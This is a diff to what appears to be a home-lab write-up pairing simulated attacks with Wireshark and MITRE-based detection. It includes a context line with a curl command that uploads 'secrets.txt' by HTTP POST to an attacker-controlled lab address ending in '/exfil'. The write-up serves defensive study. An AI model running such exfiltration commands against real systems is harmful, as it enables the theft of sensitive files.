@@ -46,8 +46,7 @@ Filter:
 (http.request or tls.handshake.type==1) and !(ssdp)
  ```
 
-Observed outbound connection from victim to attacker, followed by command execution (e.g., whoami or dir in the TCP stream).
-Sysmon Integration: Event ID 3 - Network Connection logs the outbound connection.
+Observed outbound connection from victim to attacker, followed by command execution.
 MITRE Mapping: T1071 – Application Layer Protocol (C2); T1059 – Command and Scripting Interpreter.
 
 ---
@@ -60,7 +59,6 @@ Simulated exfiltration of sensitive data by uploading a file via HTTP POST from 
 cmdcurl -X POST -F "file=@secrets.txt" http://192.168.2.131:8080/exfil
  ```
 Attacker received the file on Kali using a simple Python HTTP server with POST handling.
-
 
 Blue Team Detection (Wireshark):
 
